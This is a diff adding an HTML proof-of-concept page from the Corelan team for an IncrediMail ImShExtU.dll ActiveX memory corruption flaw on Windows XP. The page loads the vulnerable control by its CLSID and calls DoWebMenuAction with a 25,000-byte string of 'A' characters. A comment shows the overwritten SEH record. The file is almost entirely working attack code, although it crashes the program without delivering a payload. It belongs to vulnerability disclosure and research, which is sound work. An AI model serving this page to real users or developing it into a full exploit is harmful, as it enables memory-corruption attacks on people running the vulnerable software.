@@ -1,0 +1,50 @@
+<html>
+<!--
+        |------------------------------------------------------------------|
+        |                         __               __                      |
+        |   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+        |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+        | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+        | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+        |                                                                  |
+        |                                       http://www.corelan.be:8800 |
+        |                                              security@corelan.be |
+        |                                                                  |
+        |-------------------------------------------------[ EIP Hunters ]--|
+
+# Software      : Incredimail (ImShExtU.dll)
+# Reference     : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-038
+# Author        : Lincoln
+# OS            : Windows
+# Tested on     : XP SP3 En (VirtualBox)
+# Type of vuln  : SEH
+# Greetz to     : Corelan Security Team 
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+#
+#0013F1A4   41414141  AAAA
+#0013F1A8   41414141  AAAA
+#0013F1AC   41414141  AAAA  Pointer to next SEH record
+#0013F1B0   41414141  AAAA  SE handler
+#0013F1B4   41414141  AAAA
+#0013F1B8   41414141  AAAA
+#
+-->
+
+<object classid='clsid:F8984111-38B6-11D5-8725-0050DA2761C4' id='target' ></object>
+<script language='vbscript'>
+
+
+crash=String(25000, "A")
+target.DoWebMenuAction crash
+
+
+</script>
+<b><center>IncrediMail ImShExtU.dll ActiveX Memory Corruption</b></center>
+</html>
